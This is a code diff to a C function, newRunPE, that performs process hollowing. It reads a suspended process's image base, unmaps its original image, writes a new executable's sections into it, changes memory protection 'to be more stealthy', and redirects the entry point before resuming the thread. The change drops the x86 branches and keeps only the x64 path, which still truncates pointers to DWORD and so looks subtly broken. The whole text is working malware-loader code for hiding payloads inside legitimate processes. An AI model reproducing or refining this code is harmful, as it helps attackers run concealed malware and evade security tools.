@@ -460,13 +460,8 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 
 						// Get image base of target process
 						if (GetThreadContext(PI.hThread, CTX)) {
-							#ifndef X64
-								ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
-							#endif
-							#ifdef X64
-								ReadProcessMemory(PI.hProcess, (PVOID)(CTX->Rdx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
-							#endif
-
+							ReadProcessMemory(PI.hProcess, (PVOID)(CTX->Rdx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
+							
 							// Unmap old image
 							if (((DWORD)(dwImageBase)) == INH->OptionalHeader.ImageBase) {
 								xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
@@ -485,23 +480,13 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 									WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
 								}
 
-								#ifndef X64
-									// Fix image base
-									WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(PVOID), NULL);
-									// Fix memory protection after write to be more stealthy							
-									VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
-									// Set new entry point and resume target main thread
-									CTX->Eax = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
-								#endif
-								#ifdef X64
-									// Fix image base
-									WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Rdx + (sizeof(SIZE_T) * 2)), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(PVOID), NULL);
-									// Fix memory protection after write to be more stealthy							
-									VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
-									// Set new entry point and resume target main thread
-									CTX->Rcx = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
-								#endif
-
+								// Fix image base
+								WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Rdx + (sizeof(SIZE_T) * 2)), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(PVOID), NULL);
+								// Fix memory protection after write to be more stealthy							
+								VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
+								// Set new entry point and resume target main thread
+								CTX->Rcx = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
+								
 								// Set target thread context and resume main thread
 								SetThreadContext(PI.hThread, CTX);
 								ResumeThread(PI.hThread);							
